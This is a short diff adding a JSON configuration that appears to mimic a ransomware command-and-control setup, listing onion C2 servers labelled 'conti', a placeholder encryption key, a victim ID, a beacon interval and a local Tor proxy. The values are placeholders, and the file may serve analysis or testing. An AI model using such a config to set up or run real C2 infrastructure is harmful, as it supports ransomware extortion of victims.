@@ -1,0 +1,11 @@
+{
+  "servers": [
+    "conti-c2.onion",
+    "backup-c2.onion",
+    "192.0.2.100:443"
+  ],
+  "encryption_key": "base64_encoded_key",
+  "victim_id": "unique_id_123",
+  "check_interval": 3600,
+  "tor_proxy": "127.0.0.1:9050"
+}
